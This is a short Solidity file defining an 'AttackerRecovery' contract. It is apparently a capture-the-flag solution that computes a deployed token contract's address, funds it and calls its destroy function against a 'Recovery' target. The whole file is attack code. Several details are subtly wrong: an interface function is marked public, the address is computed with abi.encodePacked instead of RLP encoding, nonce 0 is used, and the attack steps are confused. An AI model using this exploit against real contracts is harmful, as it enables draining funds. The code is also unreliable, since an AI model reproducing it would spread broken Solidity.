pragma solidity ^0.8.0;

interface IRecovery {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}

interface ISimpleToken {
    function destroy(address payable _to) public;
}


contract AttackerRecovery {
    address public immutable recoveryInstance;

    constructor(address _recoveryInstance) {
        recoveryInstance = _recoveryInstance;
    }

    function calculateTokenAddress(uint256 nonce) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(recoveryInstance, nonce));
        return address(uint160(bytes20(hash << 96)));
    }

    function attack() external payable {
        IRecovery(recoveryInstance).generateToken("TestToken", 0);
        address simpleTokenAddress = calculateTokenAddress(0);
        (bool success, ) = payable(simpleTokenAddress).call{value: msg.value}();
        require(success, "Failed to send to token");
        ISimpleToken(simpleTokenAddress).destroy(payable(recoveryInstance));
    }
}
